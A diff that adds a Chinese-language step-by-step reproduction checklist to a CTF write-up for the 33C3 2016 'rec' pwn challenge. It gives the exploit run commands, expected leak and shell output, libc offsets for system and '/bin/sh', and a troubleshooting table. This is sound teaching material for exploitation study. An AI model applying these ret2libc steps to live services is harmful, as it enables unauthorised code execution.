@@ -321,6 +321,9 @@ sign_zero(p)
 
 ## 4. 本地验证
 
+> 需要“换一台机器从零复现”的完整顺序（取二进制、校验 hash、建 venv、排错表）见 **§8**；
+> 本节只做拿到文件后的快速验证。
+
 32 位二进制需要 i386 loader。本机没有 `/lib/ld-linux.so.2` 时，先取一份
 i386 libc（原题同代 2.24，取自 old-releases）：
 
@@ -456,3 +459,155 @@ system             = 0x3a8b0
 
 一句话：**`Sign(0)` 的 `call [ebp-0x20]` 给的是任意调用，Polish 求和的 `esp -= 8`
 把 `puts` 和 `___libc_start_main@got` 精确喷进去；先 leak，再喷 `system("/bin/sh")`。**
+
+---
+
+## 8. 从零复现清单（照抄即可）
+
+> 目标：在一台干净的 x86_64 Linux 上，只靠本文档把 flag 打出来。
+> 前面的 §2 解释原理，这一节只给“按顺序执行的命令 + 校验点 + 预期输出”。
+
+### 8.1 环境（一次性）
+
+```bash
+cd '/home/yfhd5/Pwn Writeups'
+python3 -m venv .venv          # 已存在则跳过
+source .venv/bin/activate      # 本仓库所有命令都要求先激活 .venv
+pip install -r requirements.txt
+python -c 'import pwn; print(pwn.__version__)'
+```
+
+需要系统里有 `curl` 与 `dpkg`（Debian/Ubuntu 系自带）；磁盘约 100 MB。
+
+### 8.2 取题目二进制，并校验
+
+```bash
+cd '/home/yfhd5/Pwn Writeups/ret2libc'
+
+# 公开归档：ctfs/write-ups-2016 的 33c3-ctf/pwn/rec-200
+curl -fsSL -o rec_33c3_2016 \
+  https://raw.githubusercontent.com/ctfs/write-ups-2016/master/33c3-ctf/pwn/rec-200/rec
+
+sha256sum rec_33c3_2016
+# 期望：cc549fbc6045151381eae842b8f4b7a3130c1bcf0e22d5f2093ad92008ebed49
+# 大小 9564 B（md5 07d38b4bc09644f6aaa8e7bce843b285）
+```
+
+> 已核对：该 URL 下载到的文件与仓库里现有的 `rec_33c3_2016`、根目录的
+> `rec_33c3_2016` 三者 sha256 完全相同。
+> 如果 `raw.githubusercontent.com` 被墙/被 RST，可改走 GitHub API：
+> ```bash
+> curl -fsSL -o /tmp/rec.json \
+>   https://api.github.com/repos/ctfs/write-ups-2016/git/blobs/90f74f94052d7c077d4cbe637593d7a120baac39
+> python -c "import base64,json;open('rec_33c3_2016','wb').write(base64.b64decode(json.load(open('/tmp/rec.json'))['content']))"
+> sha256sum rec_33c3_2016   # 同上的 cc549fbc…
+> ```
+
+### 8.3 取 i386 glibc 2.24（含 loader）
+
+```bash
+mkdir -p /tmp/libc224/root
+cd /tmp
+curl -fsSL -O \
+  http://old-releases.ubuntu.com/ubuntu/pool/main/g/glibc/libc6_2.24-3ubuntu2.2_i386.deb
+dpkg -x libc6_2.24-3ubuntu2.2_i386.deb /tmp/libc224/root
+
+ls /tmp/libc224/root/lib/ld-linux.so.2 \
+   /tmp/libc224/root/lib/i386-linux-gnu/libc.so.6
+md5sum /tmp/libc224/root/lib/i386-linux-gnu/libc.so.6
+# 期望：79f8c0d940ae393b3ad1be40892c9c84
+
+cp /tmp/libc224/root/lib/i386-linux-gnu/libc.so.6 \
+   '/home/yfhd5/Pwn Writeups/ret2libc/libc-2.24.so'
+```
+
+> `/tmp/libc224` 只是临时解包目录，重装系统后按上面三行重建即可。
+> EXP 的两个环境变量就指这里：`I386_LD` = loader，`I386_LIBPATH` = 含 `libc.so.6` 的目录。
+
+### 8.4 跑通（一条命令）
+
+```bash
+cd '/home/yfhd5/Pwn Writeups'
+source .venv/bin/activate
+cd ret2libc
+
+echo 'flag{repro_ok}' > flag.txt      # EXP 拿到 shell 后会 cat flag*
+I386_LD=/tmp/libc224/root/lib/ld-linux.so.2 \
+I386_LIBPATH=/tmp/libc224/root/lib/i386-linux-gnu \
+python 25_rec_33c3_2016_exp.py LOCAL
+rm -f flag.txt
+```
+
+预期输出（地址随机，格式固定）：
+
+```text
+[*] note leak: stack = 0xffde0518, text = 0xf7f576fb
+[*] text = 0xf7f57000, puts = 0xf7f57520, lsm@got = 0xf7f59fe0
+[+] lsm = 0xf7d33060, libc = 0xf7d0d000, system = 0xf7d61830, binsh = 0xf7edf167
+__PWNED__
+flag{repro_ok}
+[+] GOT THE FLAG: flag{repro_ok}
+```
+
+自检要点：
+
+- `text` 必须以 `000` 结尾（PIE 页对齐），否则 note 泄漏判断失败；
+- `libc` 也必须以 `000` 结尾，否则 `LIBC=` 给错了文件；
+- 最后一行必须是 `[+] GOT THE FLAG: …`。只出现 `__PWNED__` 说明 shell 通了、
+  但当前目录没有 `flag.txt`（这本身也说明 EXP 成功）。
+
+### 8.5 换了副本时的自检（二进制一致性）
+
+如果手上不是 8.2 那份文件，先用这两条确认它是同一个 build：
+
+```bash
+readelf -hW rec_33c3_2016 | grep Type        # 期望 DYN（PIE）
+objdump -d -M intel rec_33c3_2016 | grep -E '^ +(6c0|aa3|cdb|d3e):'
+# 期望 4 行：
+#   6c0: push ebp     <- read_line
+#   aa3: push ebp     <- Polish
+#   cdb: push ebp     <- Sign
+#   d3e: call eax     <- 未初始化函数指针的调用点（必须是 call eax）
+```
+
+再看 §2 里出现的四个地址是否都在：`0x6c0`（read_line）、`0xaa3`（Polish）、
+`0xcdb`（Sign）、`0xd3e`（`call eax`）。四个偏移 `0x520` / `0x2fe0` / `0x6fb`
+与填充数 `0x63` **只对这一个 build 成立**；换 build 必须重算（重算方法见 §2.4、§2.5）。
+
+### 8.6 失败排查
+
+| 现象 | 原因 | 处理 |
+| --- | --- | --- |
+| `[-] no 32-bit loader` | 没设 `I386_LD`，且系统无 `/lib/ld-linux.so.2` | 按 §8.3 解包并传环境变量 |
+| `note leak truncated` | 泄漏里出现 `\x00`，`puts` 提前截断 | 直接重跑（脚本自带 5 次重试） |
+| `bad text base 0x...` | 泄漏错位或不是同一 build | 校验 sha256；重跑 |
+| `libc leak truncated` | `___libc_start_main` 地址含 `\x00` | 直接重跑 |
+| `bad libc base 0x...` | `LIBC=` 指到了 64 位或别的版本 | 用 §8.3 的 i386 `libc.so.6` |
+| 进程 `SIGSEGV` 在 `0x7fffffff` | 地址按无符号发送，被 `atoi` 饱和 | 用脚本里的 `s32()`，别手发十进制 |
+| `SIGSEGV` 在别的怪地址 | 填充数/偏移不对（换了 build 或改了脚本） | 回到 §2.4 重算 `0x63` |
+
+### 8.7 远程（留档）
+
+原题服务已下线，将来若有复刻靶机：
+
+```bash
+LIBC=./libc-2.24.so HOST=<host> PORT=<port> \
+  python 25_rec_33c3_2016_exp.py
+```
+
+- 必须提供**目标同版本**的 libc；先用 leak 出的 `__libc_start_main` 对版本。
+- 原题 Ubuntu 16.10 / glibc 2.24-3ubuntu2：`system=0x3a8b0`、`/bin/sh=0x15cbcf`；
+  仓库里的 2.24-3ubuntu2.2：`system=0x3b020`、`/bin/sh=0x15f7cf`，
+  两者 `__libc_start_main` 都是 `0x18180`。
+- 需要 TLS（CTF² 等）时加 `SSL=1`。
+
+### 8.8 本次验证记录（可对照）
+
+| 日期 | 环境 | 结果 |
+| --- | --- | --- |
+| 2026-11-23 | i386 glibc 2.24-3ubuntu2.2（`/tmp/libc224`） | `[+] GOT THE FLAG: flag{rec_dup_check}` |
+| 2026-11-23 | i386 glibc 2.43（`/tmp/libc32`） | `[+] GOT THE FLAG: flag{rec_243_check}` |
+| 2026-11-23 | 隔离目录 `/tmp/rectest` 连续 5 次 | 5/5 成功（早期 2 次失败是并行命令抢 `flag.txt`） |
+| 2026-11-23 | **cleanroom**：`/tmp/reprotest` 新目录，按 §8.2/§8.3 取二进制与 libc（重新 `curl` deb、`dpkg -x` 到 `/tmp/libc224fresh`），按 §8.4 运行 | `[+] GOT THE FLAG: flag{cleanroom_ok}`（证明本清单本身可独立复现） |
+
+
